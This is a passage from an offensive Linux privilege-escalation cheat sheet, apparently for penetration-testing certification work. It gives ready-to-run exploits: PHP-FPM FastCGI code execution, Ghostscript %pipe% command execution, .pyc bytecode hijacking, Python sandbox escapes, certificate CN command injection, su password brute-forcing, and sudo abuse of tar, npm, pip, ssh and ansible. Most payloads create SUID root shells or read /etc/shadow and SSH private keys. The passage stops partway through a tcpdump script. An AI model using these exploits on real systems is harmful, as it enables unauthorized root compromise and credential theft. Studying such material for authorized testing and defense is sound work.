# In the ForceCommand/restricted shell context, xauth runs BEFORE the shell restriction

# Payload via xauth add — read arbitrary files:
# (from SSH client session with -X forwarding active)
xauth add <TARGET>:10 MIT-MAGIC-COOKIE-1 $(xxd -p /etc/shadow | head -c 40)
# Or: info command injection through the cookie value with shell metacharacters

# Scripted exploitation — inject newline into display value:
ssh -X -o 'XAuthLocation=blah' <USER>@<TARGET> "echo \$(id) > /tmp/xauth_proof"
```

#### Living-off-the-land / LOTL variant

```bash
# Only ssh client needed (standard on any Linux/Mac)
# The injection happens through the SSH X11 forwarding protocol itself
# No tools to install — ssh -X is the attack vector
ssh -X <USER>@<TARGET>
```

### 4.16h PHP disable_functions Bypass via PHPRC Environment + Privileged Daemon

When a privileged daemon reads a `PHPRC` environment variable (or loads PHP config from an attacker-controllable JSON/YAML config), point it at a custom `php.ini` that clears `disable_functions` and sets `auto_prepend_file` to your payload. The daemon executes PHP without restrictions as root.

```bash
# Detect — identify privileged processes invoking PHP with controllable config
ps auxf | grep -iE "php|daemon" | grep root
# Look for custom daemons that invoke PHP internally
find / -type f -executable -exec grep -l "PHPRC\|php.ini\|php_ini" {} \; 2>/dev/null | head -20

# Check if a daemon config file (JSON/YAML/INI) references a PHP config path
find /etc /opt -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.conf" 2>/dev/null | \
  xargs grep -liE "php.*ini\|PHPRC\|php_config" 2>/dev/null

# Reverse-engineer custom daemon (if binary) to find env var / config key
strings <DAEMON_BINARY> | grep -iE "PHPRC\|php.ini\|config_path\|ini_path"
```

```bash
# Exploit — craft php.ini that disables all restrictions + prepends payload
mkdir -p /tmp/phprc
cat > /tmp/phprc/php.ini <<'EOF'
disable_functions =
open_basedir =
auto_prepend_file = /tmp/phprc/pwn.php
EOF

cat > /tmp/phprc/pwn.php <<'EOF'
<?php system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"); ?>
EOF

# Method A: set PHPRC env if daemon reads it (e.g., writable systemd override)
mkdir -p /etc/systemd/system/<DAEMON_SERVICE>.service.d 2>/dev/null
cat > /etc/systemd/system/<DAEMON_SERVICE>.service.d/override.conf <<'EOF'
[Service]
Environment=PHPRC=/tmp/phprc
EOF
systemctl daemon-reload && systemctl restart <DAEMON_SERVICE>

# Method B: modify daemon's own config if writable
# e.g., JSON config with "php_ini_path": "/tmp/phprc/php.ini"
# Restart daemon or wait for config reload

/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# mkdir + cat to create php.ini and payload — all POSIX standard
# The PHP engine itself does the code execution via auto_prepend_file
# If you cannot modify systemd units, check for writable daemon config files
mkdir -p /tmp/phprc
printf "[PHP]\ndisable_functions=\nauto_prepend_file=/tmp/phprc/p.php\n" > /tmp/phprc/php.ini
printf "<?php system('id > /tmp/php_proof'); ?>" > /tmp/phprc/p.php
```

### 4.16i PHP-FPM (FastCGI) Direct Protocol RCE on Port 9000

When PHP-FPM listens on an internal port (9000) or unix socket without authentication, send raw FastCGI packets to execute arbitrary PHP code as the FPM pool user. Common lateral movement vector when you compromise a web container but PHP-FPM runs as a different (often more privileged) user.

```bash
# Detect — find PHP-FPM listening sockets
ss -tlnp | grep -E "9000|php-fpm"
find / -name "*.sock" -path "*php*" 2>/dev/null
ps auxf | grep php-fpm
# Check pool user (www.conf → user = <POOL_USER>)
cat /etc/php/*/fpm/pool.d/www.conf 2>/dev/null | grep -E "^user|^group|^listen"
```

```bash
# Method 1: cgi-fcgi (ships with libfcgi-bin on Debian/Ubuntu)
SCRIPT_FILENAME=/var/www/html/index.php \
SCRIPT_NAME=/index.php \
REQUEST_METHOD=GET \
QUERY_STRING="cmd=id" \
cgi-fcgi -bind -connect 127.0.0.1:9000

# Method 2: Python one-liner FastCGI client (no pip install — uses struct/socket only)
python3 -c '
import socket, struct

def build_fcgi_record(rtype, rid, content):
    clen = len(content)
    pad = (8 - clen % 8) % 8
    return struct.pack(">BBHHBx", 1, rtype, rid, clen, pad) + content + b"\x00"*pad

def build_params(params):
    data = b""
    for k, v in params.items():
        kl, vl = len(k), len(v)
        if kl < 128: data += struct.pack("B", kl)
        else: data += struct.pack(">I", kl | 0x80000000)
        if vl < 128: data += struct.pack("B", vl)
        else: data += struct.pack(">I", vl | 0x80000000)
        data += k.encode() + v.encode()
    return data

params = {
    "SCRIPT_FILENAME": "/var/www/html/index.php",
    "SCRIPT_NAME": "/index.php",
    "REQUEST_METHOD": "GET",
    "DOCUMENT_ROOT": "/var/www/html",
    "PHP_VALUE": "auto_prepend_file = php://input",
    "PHP_ADMIN_VALUE": "allow_url_include = On\ndisable_functions = \nopen_basedir = /"
}
body = b"<?php system(\"id; cat /etc/shadow\"); ?>"
s = socket.socket()
s.connect(("127.0.0.1", 9000))
s.send(build_fcgi_record(1, 1, struct.pack(">HHBxxx", 0, 0, 0)))  # BEGIN_REQUEST
s.send(build_fcgi_record(4, 1, build_params(params)))               # PARAMS
s.send(build_fcgi_record(4, 1, b""))                                # PARAMS end
s.send(build_fcgi_record(5, 1, body))                               # STDIN
s.send(build_fcgi_record(5, 1, b""))                                # STDIN end
print(s.recv(65536).decode(errors="replace"))
s.close()
'
```

```bash
# Method 3: Unix socket variant
python3 -c '
import socket
# Same build_fcgi_record and build_params as above...
s = socket.socket(socket.AF_UNIX)
s.connect("/run/php/php-fpm.sock")
# ... same send/recv pattern
'
```

#### Living-off-the-land / LOTL variant

```bash
# cgi-fcgi is the LOTL tool (part of libfcgi-bin, often present on PHP servers)
which cgi-fcgi 2>/dev/null
# If unavailable, the python3 method above uses only stdlib (socket + struct)
# No pip install needed — works on any system with python3
```

### 4.16j PostScript/Ghostscript Template Injection (ps2pdf -dNOSAFER)

When a cron job or web service converts user-supplied PostScript/EPS files via `gs` or `ps2pdf` without `-dSAFER`, Ghostscript's PostScript interpreter can read/write arbitrary files and execute commands via the `(%pipe%)` device.

```bash
# Detect — find Ghostscript invocations
grep -rE "gs |ghostscript|ps2pdf|eps2pdf" /etc/cron* /opt/ /usr/local/bin/ /var/www/ 2>/dev/null
ps auxf | grep -iE "gs |ghostscript" | grep -v grep
# Check if -dSAFER is present (if absent → vulnerable)
# Also check for -dNOSAFER which explicitly disables sandboxing
```

```bash
# Exploit A: Arbitrary file read via PostScript
cat > /tmp/evil.ps <<'EOF'
%!PS
(/etc/shadow) (r) file
256 string readstring pop
(output.txt) (w) file dup 3 -1 roll writestring closefile
quit
EOF
# If the cron/service processes /tmp/evil.ps → /etc/shadow content written to output.txt

# Exploit B: Command execution via %pipe% device
cat > /tmp/evil.ps <<'EOF'
%!PS
(%pipe%cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash) (w) file closefile
quit
EOF
# Place in the directory the ps2pdf job processes

# Exploit C: File write (e.g., SSH key injection)
cat > /tmp/evil.ps <<'EOF'
%!PS
(/root/.ssh/authorized_keys) (w) file
dup (<ATTACKER_PUB_KEY>) writestring
closefile quit
EOF
```

#### Living-off-the-land / LOTL variant

```bash
# Only cat/echo needed to create the .ps file — Ghostscript does the execution
# PostScript IS the programming language — no external tools needed in the payload
# The %pipe% device is Ghostscript's built-in command execution facility
echo '%!PS' > /tmp/test.ps
echo '(%pipe%id > /tmp/gs_proof) (w) file closefile quit' >> /tmp/test.ps
```

### 4.16k PyInstaller spec-file Abuse via sudo NOPASSWD — Read Root Files with datas=[]

When `sudo -l` allows `pyinstaller` (or a wrapper that calls it), a `.spec` file's `datas=[('/etc/shadow', '.')]` directive copies arbitrary root-owned files into the build output directory readable by the attacker.

```bash
# Detect
sudo -l | grep -iE "pyinstaller"
which pyinstaller 2>/dev/null
```

```bash
# Exploit — craft .spec file that bundles root-only files into output
cat > /tmp/pwn.spec <<'EOF'
# PyInstaller spec — bundles target files into dist/
a = Analysis(['dummy.py'], datas=[('/etc/shadow', '.'), ('/root/.ssh/id_rsa', '.')], pathex=['/tmp'])
pyz = PYZ(a.pure)
exe = EXE(pyz, a.scripts, a.binaries, a.datas, name='pwn')
EOF

echo "print('x')" > /tmp/dummy.py
sudo pyinstaller /tmp/pwn.spec --distpath /tmp/loot --workpath /tmp/build --specpath /tmp

# Read the bundled files from the output
cat /tmp/loot/shadow 2>/dev/null || find /tmp/loot -type f | xargs cat 2>/dev/null
cat /tmp/loot/id_rsa 2>/dev/null
```

#### Living-off-the-land / LOTL variant

```bash
# pyinstaller itself is the tool (already present if sudo allows it)
# Only cat/echo needed to create the spec and dummy script
# The datas=[] directive is the file-read primitive — pyinstaller copies as root
```

### 4.16l Python __pycache__ Bytecode Hijack with Magic-Header Transplant

When a root-executed Python script imports a module from a directory where you can write to `__pycache__/`, replacing the `.pyc` file with a malicious one (with the correct magic header) hijacks execution on next import.

```bash
# Detect — find writable __pycache__ directories under root-run scripts
find / -name "__pycache__" -writable 2>/dev/null
# Identify the Python script run by root and its imports
cat <ROOT_SCRIPT> | grep -E "^import|^from"
ls -la <SCRIPT_DIR>/__pycache__/
```

```bash
# Step 1: Identify target .pyc and extract its magic header (first 16 bytes)
PYVER=$(python3 -c "import sys; print(f'{sys.version_info.major}{sys.version_info.minor}')")
TARGET_PYC="<MODULE_NAME>.cpython-${PYVER}.pyc"
xxd -l 16 <SCRIPT_DIR>/__pycache__/${TARGET_PYC} > /tmp/magic_header.hex

# Step 2: Create malicious .py source
cat > /tmp/evil_module.py <<'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
EOF

# Step 3: Compile to .pyc and transplant the original magic header
python3 -c "
import py_compile, struct, sys, time
py_compile.compile('/tmp/evil_module.py', '/tmp/evil.pyc', doraise=True)
"

# Step 4: Replace magic bytes to match expected timestamp/size
python3 -c "
import sys
with open('<SCRIPT_DIR>/__pycache__/${TARGET_PYC}', 'rb') as f:
    original_header = f.read(16)
with open('/tmp/evil.pyc', 'rb') as f:
    evil_data = f.read()
with open('<SCRIPT_DIR>/__pycache__/${TARGET_PYC}', 'wb') as f:
    f.write(original_header + evil_data[16:])
"

# Wait for root script to run → /tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# python3 (already on target if root runs Python) handles compilation + header transplant
# No pip install needed — py_compile is stdlib
python3 -c "
import py_compile
py_compile.compile('/tmp/evil_module.py', '<SCRIPT_DIR>/__pycache__/<MODULE>.cpython-3<VER>.pyc')
"
```

### 4.16m Python Restricted Sandbox Escape (__builtins__ Stripped)

When a custom "safe_python" or RestrictedPython binary strips `__builtins__` and blocks `import`, escape via MRO class walking, `gc.get_objects()`, or `sys._getframe()` to recover code execution primitives.

```bash
# Detect — identify restricted Python interpreters
find / -name "*safe*python*" -o -name "*restricted*" -o -name "*sandbox*" 2>/dev/null | grep -i py
# Try basic import — if it fails, you're in a sandbox
# >>> import os  → NameError or ImportError
```

```python
# Escape A: MRO class walk (works when __builtins__ is stripped but object access exists)
# Find a subclass with os/subprocess access
''.__class__.__mro__[1].__subclasses__()
# Look for <class 'os._wrap_close'> or <class 'subprocess.Popen'>
[x for x in ''.__class__.__mro__[1].__subclasses__() if 'wrap_close' in str(x)]
# Typically index ~133 on Python 3.8+
''.__class__.__mro__[1].__subclasses__()[<INDEX>].__init__.__globals__['system']('id')

# Escape B: gc.get_objects() — recover builtins from garbage collector
import gc
[x for x in gc.get_objects() if hasattr(x, '__name__') and x.__name__ == 'builtins'][0].__import__('os').system('id')

# Escape C: sys._getframe() builtins resurrection
sys._getframe(0).f_builtins['__import__']('os').system('id')

# Escape D: exception-based __builtins__ recovery
try:
    raise Exception()
except Exception as e:
    import sys
    tb = sys.exc_info()[2]
    tb.tb_frame.f_globals['__builtins__']['__import__']('os').system('id')

# Escape E: type() to reconstruct function with __builtins__
exec_code = type(lambda:0)(
    type(lambda:0).__code__.__class__(0,0,0,0,0,b'',(),(),(),'','',0,b''),
    {'__builtins__': __builtins__}
)
```

```bash
# One-liner for CPTS — try these sequentially until one works:
# (paste into the restricted interpreter)
().__class__.__bases__[0].__subclasses__()[<INDEX>].__init__.__globals__['system']('cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash')
```

#### Living-off-the-land / LOTL variant

```bash
# The escape IS the LOTL technique — you're working within the Python interpreter itself
# No external tools needed; the MRO walk uses only Python language features
# Find the correct subclass index on target:
python3 -c "
for i,c in enumerate(''.__class__.__mro__[1].__subclasses__()):
    if 'wrap_close' in str(c): print(i, c)
"
```

### 4.16n sudo + http_proxy Environment Hijack — MITM Privileged curl/wget

When `sudo -l` shows SETENV or env_keep includes `http_proxy`/`https_proxy`, and the allowed command invokes curl/wget/apt, intercept the request with a local proxy to inject malicious responses (eval payloads, malicious packages, tampered configs).

```bash
# Detect
sudo -l | grep -iE "SETENV|http_proxy|https_proxy|all_proxy"
# Also check if the sudoed command fetches URLs internally
strings <ALLOWED_BINARY> | grep -iE "http://\|https://\|curl\|wget\|apt"
```

```bash
# Step 1: Start intercepting proxy (socat — often available; or python3 stdlib)
# Simple socat proxy that serves a crafted response:
cat > /tmp/proxy_response.txt <<'EOF'
HTTP/1.1 200 OK
Content-Type: text/plain

#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
EOF

socat TCP-LISTEN:8888,fork,reuseaddr SYSTEM:"cat /tmp/proxy_response.txt" &

# Step 2: Run the sudoed command with proxy set
sudo http_proxy=http://127.0.0.1:8888 https_proxy=http://127.0.0.1:8888 <ALLOWED_BINARY>
# The binary's internal HTTP request hits our proxy → receives malicious response
# If it evals/executes the response → root code execution
```

```bash
# Python3 stdlib intercepting proxy (no pip install)
python3 -c "
import http.server, socketserver

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash')
    def do_CONNECT(self):
        self.send_response(200)
        self.end_headers()

socketserver.TCPServer(('127.0.0.1', 8888), Handler).serve_forever()
" &

sudo http_proxy=http://127.0.0.1:8888 <ALLOWED_BINARY>
# After exploitation: kill %1; /tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# socat or python3 (both commonly available) — no pip install needed
# python3 http.server module is stdlib
# If neither available, use bash /dev/tcp to serve a static response:
{
  echo -e "HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\npwned"
} | nc -l -p 8888 &
sudo http_proxy=http://127.0.0.1:8888 <ALLOWED_BINARY>
```

### 4.16o POSIX Filesystem ACL Enumeration — getfacl / '+' Suffix in ls

Extended POSIX ACLs can grant file access beyond standard unix permissions. A `+` at the end of `ls -la` permissions indicates extended ACLs — enumerate them to find unexpected read/write access to privileged files.

```bash
# Detect — look for '+' suffix indicating extended ACLs
ls -la /etc/shadow /root/ /etc/sudoers 2>/dev/null | grep '+'
# Example: -rw-r-----+ 1 root shadow 1234 Jan 1 00:00 /etc/shadow
# The '+' means additional ACL entries exist

# Enumerate ACLs on sensitive files
getfacl /etc/shadow 2>/dev/null
getfacl /root/ 2>/dev/null
getfacl /etc/sudoers.d/ 2>/dev/null

# Sweep — find all files with extended ACLs that grant your user/group access
getfacl -R /etc/ 2>/dev/null | grep -B5 "<USER>\|<GROUP>" | grep "^# file:"
getfacl -R /root/ 2>/dev/null | grep -B5 "<USER>\|<GROUP>" | grep "^# file:"
getfacl -R /opt/ 2>/dev/null | grep -B5 "<USER>\|<GROUP>" | grep "^# file:"
```

```bash
# Broad sweep using find + getfacl
find / -maxdepth 4 \( -name "*.conf" -o -name "*.key" -o -name "id_rsa" -o -name "shadow" \) \
  -exec getfacl {} \; 2>/dev/null | grep -B3 "user:<USER>:r"

# If extended ACL grants write to a root-owned script/config:
getfacl <TARGET_FILE>
# user:<USER>:rw- → you can modify it despite standard permissions showing no access
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> <TARGET_FILE>
```

#### Living-off-the-land / LOTL variant

```bash
# getfacl ships with acl package (installed by default on most distros)
which getfacl 2>/dev/null
# If getfacl unavailable, check for '+' in ls output as indicator:
ls -laR /etc/ 2>/dev/null | grep '^-.*+' | head -20
# Then read the file directly — if ACL grants access, read will succeed even if ls shows no perms
cat /etc/shadow 2>/dev/null && echo "[!] ACL-granted read access to shadow"
```

### 4.16p Mounted Partition and Removable Storage Discovery

Post-foothold enumeration of mounted filesystems, removable media, and unmounted partitions can reveal backup drives, NAS shares, or secondary disks containing credentials or sensitive data not visible in the primary filesystem tree.

```bash
# Currently mounted filesystems (type, mount options, capacity)
df -hT
mount | grep -vE "proc|sys|devtmpfs|tmpfs|cgroup"
cat /proc/mounts | grep -vE "proc|sys|devtmpfs"

# Block devices — shows all partitions including unmounted ones
lsblk -f
blkid 2>/dev/null

# Removable/external media mount points
ls -la /media/ /mnt/ /run/media/ 2>/dev/null
find /media /mnt -maxdepth 3 -type f 2>/dev/null | head -30

# Unmounted partitions that could contain data
fdisk -l 2>/dev/null | grep -E "^/dev"
# Mount an unmounted partition (if permissions allow)
mkdir -p /tmp/mnt_check
mount /dev/<PARTITION> /tmp/mnt_check 2>/dev/null
ls -la /tmp/mnt_check/
```

```bash
# Look for interesting files on mounted shares/drives
find /media /mnt -type f \( -name "*.kdbx" -o -name "*.key" -o -name "id_rsa" -o -name "*.bak" \
  -o -name "*.sql" -o -name "*.conf" -o -name "*.env" -o -name "*.ovpn" \) 2>/dev/null
# Backup files often contain old credentials
find /media /mnt -name "*.tar.gz" -o -name "*.zip" -o -name "*.bak" 2>/dev/null
```

#### Living-off-the-land / LOTL variant

```bash
# All commands above are LOTL — df, mount, lsblk, blkid, cat /proc/mounts
# Minimum viable (works on any Linux):
cat /proc/mounts | grep -v "^proc\|^sys\|^devpts\|^tmpfs"
cat /proc/partitions
ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
```

### 4.16q sucrack — Local su Password Brute-Force

When password hashes are not extractable (unreadable `/etc/shadow`, no hashcat path) but you need another user's password for lateral movement or `su`, brute-force the `su` binary locally. Works entirely offline against PAM authentication.

```bash
# Method 1: sucrack (if transferrable — pre-compiled static binary)
# sucrack runs su in a pseudo-terminal and tests passwords from a wordlist
sucrack -u <TARGET_USER> -w 20 /usr/share/wordlists/rockyou.txt
# -w = number of worker threads (adjust to avoid detection/lockout)
# -a = use ansi escape codes for su prompt detection
sucrack -a -u <TARGET_USER> -w 10 <WORDLIST>
```

```bash
# Method 2: Pure bash su brute-force (LOTL — no tools needed)
#!/bin/bash
TARGET_USER="<TARGET_USER>"
WORDLIST="/tmp/passwords.txt"

while IFS= read -r pass; do
  echo "$pass" | timeout 2 su - "$TARGET_USER" -c "echo SUCCESS" 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "[+] Password found: $pass"
    break
  fi
done < "$WORDLIST"
```

```bash
# Method 3: expect-based (more reliable prompt handling)
cat > /tmp/su_brute.sh <<'SCRIPT'
#!/bin/bash
while IFS= read -r pass; do
  expect -c "
    spawn su - <TARGET_USER> -c id
    expect \"Password:\"
    send \"$pass\r\"
    expect {
      \"uid=\" { puts \"[+] Found: $pass\"; exit 0 }
      eof { exit 1 }
    }
  " 2>/dev/null && break
done < <WORDLIST>
SCRIPT
chmod +x /tmp/su_brute.sh && /tmp/su_brute.sh
```

#### Living-off-the-land / LOTL variant

```bash
# Pure bash + su — no external tools. Works on any system with su and a pseudo-terminal.
# The bash while-loop method above is fully LOTL.
# For very short wordlists (top 100 passwords):
for p in password admin123 root toor P@ssw0rd changeme; do
  echo "$p" | timeout 1 su - <TARGET_USER> -c whoami 2>/dev/null && echo "[+] $p" && break
done
```

### 4.16r Race-Window File Harvest via Tight Copy Loop

When a privileged process temporarily writes a sensitive file then deletes it (common with temp credentials, session tokens, one-time configs), a tight copy loop or inotifywait captures the file during the brief existence window.

```bash
# Method 1: Tight copy loop (pure bash — no inotify tools)
# Target: a file that briefly appears then vanishes (e.g., /tmp/.secret, /run/creds)
while true; do
  cp <TARGET_PATH> /tmp/harvested_$(date +%s%N) 2>/dev/null
done &
HARVEST_PID=$!

# Wait for the privileged process to run (cron, manual trigger, etc.)
# Then stop:
kill $HARVEST_PID 2>/dev/null
ls -la /tmp/harvested_*
cat /tmp/harvested_* 2>/dev/null | sort -u
```

```bash
# Method 2: inotifywait (more efficient — triggers only on file creation)
# Monitor directory for file creation events
inotifywait -m -e create -e modify <TARGET_DIR> |
while read dir action file; do
  cp "${dir}${file}" "/tmp/harvest_${file}_$(date +%s)" 2>/dev/null
  echo "[+] Captured: ${dir}${file}"
done

# Method 3: Monitor AND read before deletion
inotifywait -m -e create <TARGET_DIR> --format '%w%f' |
while read filepath; do
  cat "$filepath" > "/tmp/loot_$(basename $filepath)_$(date +%s)" 2>/dev/null
done
```

#### Living-off-the-land / LOTL variant

```bash
# The tight while+cp loop is pure bash — fully LOTL, works everywhere
# inotifywait requires inotify-tools package but is often pre-installed on Ubuntu/Debian
which inotifywait 2>/dev/null || (
  # Fallback: poll with ls in tight loop
  while true; do ls <TARGET_PATH> 2>/dev/null && cp <TARGET_PATH> /tmp/got_it && break; done
)
```

### 4.16s openssl x509 Common Name Command Injection Against Parsing Scripts

When a cron job or monitoring script parses certificate subjects (`openssl x509 -subject`) and passes the CN field unquoted into a shell command, injecting shell metacharacters into a certificate's Common Name yields code execution as the script's user.

```bash
# Detect — find scripts that parse certificate subjects
grep -rE "openssl.*x509.*-subject\|openssl.*-noout.*-subject" /etc/cron* /opt/ /usr/local/bin/ 2>/dev/null
grep -rE "CN=\|commonName\|subject=" /etc/cron* /opt/ /usr/local/bin/ 2>/dev/null
# Vulnerable pattern in script:
# CN=$(openssl x509 -in $cert -noout -subject | grep -oP 'CN=\K[^/]+')
# echo "Certificate for $CN expires soon"   ← unquoted $CN = injection
```

```bash
# Exploit — generate certificate with shell metacharacters in CN
openssl req -x509 -newkey rsa:2048 -keyout /tmp/evil.key -out /tmp/evil.crt \
  -days 1 -nodes -subj '/CN=$(cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash)'

# Place the cert where the parsing script reads from
cp /tmp/evil.crt <CERT_DIRECTORY>/

# Alternative CN payloads:
# Backtick variant: /CN=`cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash`
openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.key -out /tmp/k.crt \
  -days 1 -nodes -subj '/CN=`id > /tmp/cn_proof`'

# Semicolon variant: /CN=legit;cp /bin/bash /tmp/rootbash;#
openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.key -out /tmp/k.crt \
  -days 1 -nodes -subj '/CN=legit;cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash;#'

# Wait for cron/script execution → /tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# openssl is standard on virtually every Linux system
# Only openssl + cp needed to create the malicious certificate
# The parsing script itself does the command injection via unquoted variable expansion
openssl req -x509 -newkey rsa:2048 -keyout /dev/null -out /tmp/test.crt \
  -days 1 -nodes -subj '/CN=$(id > /tmp/cn_lotl_proof)' 2>/dev/null
```

### 4.16t MySQL Client \! Shell-Escape Privesc

When user-controlled input is spliced unquoted into a `mysql -e "..."` call by a privileged script, the `\!` mysql client command escapes to a shell. Also applicable when `sudo -l` allows `mysql` — use `\! /bin/bash` to break out.

```bash
# Detect — sudo allows mysql client
sudo -l | grep -i mysql
# Or: find scripts that pass unquoted input to mysql -e
grep -rE 'mysql.*-e.*\$' /opt/ /usr/local/bin/ /etc/cron* 2>/dev/null
```

```bash
# Method 1: Direct sudo mysql → shell escape
sudo mysql -e '\! /bin/bash -p'
# Or in interactive mode:
sudo mysql
# mysql> \! /bin/bash
# mysql> system /bin/bash

# Method 2: Input injection into mysql -e call
# If a script does: mysql -u root -e "SELECT * FROM users WHERE name='$INPUT'"
# Inject: ' \! cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash \! '
# The \! causes mysql client to execute the following as a shell command

# Method 3: mysql --init-command for scripts that invoke mysql non-interactively
sudo mysql --init-command='\! cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash'
```

#### Living-off-the-land / LOTL variant

```bash
# mysql client IS the LOTL tool — present if sudo allows it
# \! is a mysql client built-in command, no external tools
sudo mysql -e '\! id > /tmp/mysql_escape_proof'
cat /tmp/mysql_escape_proof
```

[Back to top](#table-of-contents)

### 4.17 Sudo /usr/bin/ssh — PermitLocalCommand / ProxyCommand Shell Escape

When `sudo -l` shows NOPASSWD on `/usr/bin/ssh`, the SSH client itself provides multiple code-execution primitives without needing a valid remote host.

```bash
# Detect
sudo -l | grep ssh

# Method 1: ProxyCommand — executes shell command before connection attempt
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

# Method 2: PermitLocalCommand — runs LocalCommand after auth (force pseudo-tty)
sudo ssh -o PermitLocalCommand=yes -o LocalCommand='/bin/bash' <USER>@127.0.0.1

# Method 3: Pre-authentication — no valid host needed
sudo ssh -o ProxyCommand='/bin/bash -i' x

# Method 4: SSH escape sequence (if already in sudo ssh session)
# Press ~C to open ssh> prompt, then:
# ssh> !sh
```

#### Living-off-the-land / LOTL variant

```bash
# ssh is the tool itself — fully LOTL, no downloads needed
# ProxyCommand method requires no network access (connection never completes)
sudo ssh -o ProxyCommand='/bin/sh 0<&2 1>&2' x
```

### 4.17b Sudo tar — Direct GTFOBin Abuse (No Wildcard Required)

When `sudo -l` shows NOPASSWD on `/bin/tar` or `/usr/bin/tar`, the `--checkpoint-action` flag provides direct code execution without any wildcard or cron dependency.

```bash
# Detect
sudo -l | grep tar

# Method 1: --checkpoint-action=exec (simplest)
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# Method 2: Spawn SUID bash for persistence across the session
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
/tmp/rootbash -p

# Method 3: --to-command (pipe extracted data to command)
echo '' | sudo tar xf - --to-command='/bin/bash'

# Method 4: Compressed archive with payload
sudo tar czf /dev/null /etc/hostname --checkpoint=1 --checkpoint-action='exec=sh -c "id > /tmp/proof"'
```

#### Living-off-the-land / LOTL variant

```bash
# tar ships with every Linux installation — fully LOTL
# The --checkpoint-action mechanism is built into GNU tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### 4.17c Sudo npm install — Lifecycle Script Abuse for Root

When `sudo -l` shows NOPASSWD on `/usr/bin/npm` or `/usr/local/bin/npm`, npm's lifecycle scripts (preinstall/install/postinstall) execute as root during `npm install`.

```bash
# Detect
sudo -l | grep npm

# Method 1: Create minimal package with preinstall hook
mkdir /tmp/npmpwn && cd /tmp/npmpwn
cat > package.json <<'EOF'
{
  "name": "pwn",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
  }
}
EOF
sudo npm install --unsafe-perm

# Method 2: Using npm exec (npm 7+)
sudo npm exec --yes -- /bin/bash

# Method 3: npm run-script with arbitrary command
echo '{"scripts":{"pwn":"/bin/bash"}}' > /tmp/p.json
sudo npm --prefix /tmp run pwn --userconfig=/tmp/p.json

# Collect
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# npm is the tool itself; only echo/cat needed to create package.json
# No network access required — npm install on a local dir with no deps just runs scripts
mkdir /tmp/x && echo '{"scripts":{"preinstall":"id > /tmp/proof"}}' > /tmp/x/package.json
sudo npm install /tmp/x --unsafe-perm
```

### 4.17d Sudo pip install — setup.py Code Execution as Root

When `sudo -l` shows NOPASSWD on `/usr/bin/pip` or `/usr/bin/pip3`, `pip install` of a local directory executes `setup.py` as root.

```bash
# Detect
sudo -l | grep pip

# Method 1: Local directory with malicious setup.py
mkdir /tmp/pippwn && cd /tmp/pippwn
cat > setup.py <<'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
EOF
sudo pip install /tmp/pippwn

# Method 2: pip install with --pre and local egg-info
cat > /tmp/pippwn/setup.py <<'EOF'
from setuptools import setup
import os
os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
setup(name="pwn", version="1.0")
EOF
sudo pip3 install /tmp/pippwn

# Method 3: pip download + install (works when install from URL is blocked)
sudo pip install --no-deps --no-build-isolation /tmp/pippwn

# Collect
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# pip is the tool; setup.py is just Python — no downloads needed
mkdir /tmp/p && cat > /tmp/p/setup.py <<'EOF'
import os; os.system("id > /tmp/proof")
EOF
sudo pip install /tmp/p 2>/dev/null
cat /tmp/proof
```

### 4.17e Sudo ansible-playbook — Arbitrary File Read via Parser Error

When `sudo -l` shows NOPASSWD on `/usr/bin/ansible-playbook`, feeding a non-YAML file causes the parser to dump the file contents in its error message — yielding arbitrary file read as root.

```bash
# Detect
sudo -l | grep ansible-playbook

# Read /etc/shadow via parser error output
sudo ansible-playbook /etc/shadow 2>&1 | head -20
# ERROR! ... We were unable to read ... the file contents:
# root:$6$...:19000:0:99999:7:::
# The error message includes the raw file content

# Read root's SSH key
sudo ansible-playbook /root/.ssh/id_rsa 2>&1

# Read any file on the system
sudo ansible-playbook <TARGET_FILE> 2>&1
```

#### Living-off-the-land / LOTL variant

```bash
# ansible-playbook is the tool itself — no additional software needed
# The parser error is the read primitive; grep to clean output
sudo ansible-playbook /etc/shadow 2>&1 | grep -v "^ERROR\|^$\|WARNING"
```

### 4.17f Sudo tcpdump — Postrotate Command Execution via -z Flag

When `sudo -l` shows NOPASSWD on `/usr/sbin/tcpdump`, the `-z` flag (post-rotate command) executes an arbitrary command after each pcap rotation — running as root.

```bash
# Detect
sudo -l | grep tcpdump

# Method 1: -z flag triggers command on file rotation
cat > /tmp/pwn.sh <<'EOF'
#!/bin/bash
